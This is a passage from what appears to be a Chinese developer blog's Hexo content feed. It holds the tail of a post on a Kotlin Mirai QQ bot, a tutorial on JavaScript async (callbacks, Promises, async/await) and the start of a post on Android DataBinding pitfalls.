string">"不许牛!!! [mirai:at:<span class="token interpolation"><span class="token delimiter variable">${</span>sender<span class="token punctuation">.</span>id<span class="token delimiter variable">}</span></span>]"</span><span class="token punctuation">.</span><span class="token function">deserializeMiraiCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment">// 戳一戳回应</span>        GlobalEventChannel<span class="token punctuation">.</span><span class="token function">parentScope</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>subscribeAlways<span class="token operator">&lt;</span>NudgeEvent<span class="token operator">&gt;</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span>id <span class="token operator">==</span> bot<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>                from<span class="token punctuation">.</span><span class="token function">nudge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sendTo</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实际效果"><a href="#实际效果" class="headerlink" title="实际效果"></a>实际效果</h2><blockquote><p>效果很好，纠正了这股不正之风</p><p>可爱的芙兰也变得有血有肉起来</p></blockquote><p><img src="https://gitee.com/coldrain-moro/images_bed/raw/master/images/QQ%E5%9B%BE%E7%89%8720211202011439.png" alt="QQ图片20211202011439"></p><h2 id="踩的坑"><a href="#踩的坑" class="headerlink" title="踩的坑"></a>踩的坑</h2><p>有时机器人会突然变哑巴，这时只需删除bot文件夹中的cache即可</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Mirai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对异步概念上的理解以及JavaScript异步操作实现方式</title>
      <link href="/2021/11/28/async-javascript/"/>
      <url>/2021/11/28/async-javascript/</url>
      
        <content type="html"><![CDATA[<h1 id="对异步概念上的理解"><a href="#对异步概念上的理解" class="headerlink" title="对异步概念上的理解"></a>对异步概念上的理解</h1><blockquote><p>对异步这个单词我早已不陌生了，从去年开始做bukkit开发开始就一直在接触这个词。然而我却从来没有真正理解过异步的含义，之前我实际上是把多线程与异步混淆了。异步操作实际上是完全可以在单线程上执行的</p></blockquote><h2 id="什么是异步？"><a href="#什么是异步？" class="headerlink" title="什么是异步？"></a>什么是异步？</h2><p>很简单，正所谓<strong>连续</strong>的操作就叫<strong>同步</strong>，<strong>不连续</strong>的操作就叫<strong>异步</strong>。</p><p>这样一看，就很好理解了。在多线程的执行环境中，我们启动一个子线程，这个子线程是<strong>串行</strong>执行的，自然是不连续的。</p><p>那么单线程中的异步操作时怎么实现的？</p><p>答案是，先执行完同步代码，最后逐个执行异步队列中的回调函数。</p><p>例如javascript中的异步 （单线程）</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token comment">// 最后执行</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>   <span class="token comment">// 操作</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"World"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果:</p><pre class="line-numbers language-none"><code class="language-none">HelloWorldHello World<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="JavaScript中的异步实现方式"><a href="#JavaScript中的异步实现方式" class="headerlink" title="JavaScript中的异步实现方式"></a>JavaScript中的异步实现方式</h2><blockquote><p>JavaScript中的异步除了Web Worker均为单线程实现</p></blockquote><h3 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h3><p>小心<strong>回调地狱</strong></p><p>回调函数不断嵌套，导致代码可读性大幅下降</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"超哥起床"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>超哥睡回笼觉<span class="token operator">==</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>"超哥回到床上超哥睡觉<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">(</span>超哥睡回笼觉<span class="token operator">==</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"超哥刷牙"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"超哥洗脸"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        超哥上厕所<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h3><blockquote><p>Promise本意是承诺，在程序中的意思就是承诺我过一段时间后会给你一个结果。 什么时候会用到过一段时间？答案是异步操作，异步是指可能比较长时间才有结果的才做，例如网络请求、读取本地文件等</p></blockquote><p>使用Promise进行异步操作会提高代码可读性 （摆脱回调地狱）</p><h4 id="then-catch-链式调用"><a href="#then-catch-链式调用" class="headerlink" title="then/catch 链式调用"></a>then/catch 链式调用</h4><p>用法类似Java的CompletableFuture，进行链式调用，可以传参。</p><p>不一样的是多了一个异常处理的回调，个人感觉比CompletableFuture好使。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">//做一些异步操作</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'执行完成'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> （我找到对象了<span class="token operator">==</span><span class="token boolean">true</span><span class="token function">）resolve</span><span class="token punctuation">(</span><span class="token string">"好耶"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">else</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">"也许你可以把标准放开一点"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">return</span> data     <span class="token comment">//此时输出data为resolve传入的参数</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>     <span class="token comment">//此时输出error为reject传入的参数</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>   <span class="token keyword">return</span> data    <span class="token comment">//好耶</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>   <span class="token comment">//好耶</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>   <span class="token comment">//undefined</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="all-race-多个异步操作的同步处理"><a href="#all-race-多个异步操作的同步处理" class="headerlink" title="all/race 多个异步操作的同步处理"></a>all/race 多个异步操作的同步处理</h4><ul><li><p>all 全部任务执行完毕后执行下一个任务</p><blockquote><p>Promise的all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完后才执行回调。</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> Promise1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> Promise2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> Promise3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>Promise1<span class="token punctuation">,</span> Promise2<span class="token punctuation">,</span> Promise3<span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token function">funciton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 三个都成功则成功  </span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 只要有失败，则失败 </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>race 多个任务进行比赛</p><p><em><strong>我选择最快的那个！</strong></em></p><blockquote><p>race方法传入多个promise参数，返回值为其中最快执行完成的promise</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//请求某个图片资源</span>   <span class="token keyword">function</span> <span class="token function">requestImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>           <span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           img<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token function">resolve</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'图片的路径'</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> p<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token comment">//延时函数，用于给请求计时</span>   <span class="token keyword">function</span> <span class="token function">timeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>           <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>               <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'图片请求超时'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> p<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">requestImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">timeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span><span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h3><p>实际上他们是基于promise实现的，它们的作用就是让你异步执行的代码同步</p><blockquote><p>async用来修饰一个方法，在async修饰的方法中可以使用await来修饰一个方法的调用。</p><p>有点类似于kotlin协程中的suspend 挂起函数 与 Deffered#await方法</p><p>但js可没有什么乱七八糟的协程作用域和上下文，毕竟这些实际上都是在单线程环境下运行的</p></blockquote><p><strong>举个栗子</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// await修饰符只能影响像这样返回一个promise的函数和被async修饰的函数</span><span class="token keyword">const</span> <span class="token function-variable function">step</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">size<span class="token punctuation">,</span> time<span class="token punctuation">,</span> ele</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>            ele<span class="token punctuation">.</span>style<span class="token punctuation">.</span>marginLeft <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>size<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">px</span><span class="token template-punctuation string">`</span></span>            <span class="token function">resolve</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 这里await会让原本异步的方法同步，也就是这里step方法彻底执行完毕才会进入下一次循环</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">await</span> <span class="token function">step</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 顺序执行任务队列</span><span class="token comment">// 让异步队列同步执行</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">awaitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">await</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token string">"one"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token string">"two"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">asyncAnimation</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">awaitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="一点小彩蛋"><a href="#一点小彩蛋" class="headerlink" title="一点小彩蛋"></a>一点小彩蛋</h4><h5 id="top-await"><a href="#top-await" class="headerlink" title="top await"></a>top await</h5><p>来自路姐姐的指导（</p><blockquote><p>在引用时加一串type=”module” </p><p>可以导入JS模块（下学期内容），还可以使用一些其他JS的新特性，比如 top await，这时 await 就不需要放在 async 函数里才能执行了</p><p>路姐的优雅代码 彳亍</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>optimize/script.js<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就可以直接在外部调用await</p><p>让我们看看路姐的优雅のcode</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> p <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token keyword">const</span> content <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">元丰六年十月十二日夜，解衣欲睡，月色入户，欣然起行。念无与为乐者，遂至承天寺寻张怀民。怀民亦未寝，相与步于中庭。庭下如积水空明，水中藻、荇交横，盖竹柏影也。何夜无月？何处无竹柏？但少闲人如吾两人者耳。</span><span class="token template-punctuation string">`</span></span><span class="token comment">// 这个函数可以达到类似Java在子线程中调用Thread.sleep的效果</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ms<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> content<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    p<span class="token punctuation">.</span>textContent <span class="token operator">=</span> content<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样写就非常彳亍了</p><h5 id="css自带的动画"><a href="#css自带的动画" class="headerlink" title="css自带的动画"></a>css自带的动画</h5><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.circle</span> <span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>    <span class="token property">transition</span><span class="token punctuation">:</span> all 1s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.circle.at-end</span> <span class="token punctuation">{</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateX</span><span class="token punctuation">(</span>200px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>transition: all 1s; 被加上了这一条，位置的改变会有一个丝滑的动画，而1s这个参数决定了移动的时间。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 知识梳理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在DataBinding的使用过程中踩的坑</title>
      <link href="/2021/11/22/problem-databinding/"/>
      <url>/2021/11/22/problem-databinding/</url>
      
        <content type="html"><![CDATA[<h1 id="在DataBinding的使用过程中踩的坑"><a href="#在DataBinding的使用过程中踩的坑" class="headerlink" title="在DataBinding的使用过程中踩的坑"></a>在DataBinding的使用过程中踩的坑</h1><p>今天初次尝试了DataBinding，之前一直在用ViewBinding。今天欣喜的发现DataBinding包含了ViewBinding的全部功能，绝绝子。</p><p>DataBinding对于基于MVVM架构理念设计的Android程序来说非常有意义，它可以进一步解耦。</p><p>不说了，来看看我今天遇到的具体问题</p><blockquote><p>DataBinding可能会导致Kotlin编译器无法smart cast, 而IDE不会标红</p></blockquote><p>我在布局文件activity_login.xml中给布局绑定了这样一个变量</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>variable</span>        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewModel<span class="token punctuation">"</span></span>        <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如你所见，我在代码中准备使用它</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">binding<span class="token punctuation">.</span>viewModel<span class="token punctuation">.</span><span class="token function">postLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这行代码在IDE中并没有标红，但无法通过编译</p><pre class="line-numbers language-none"><code 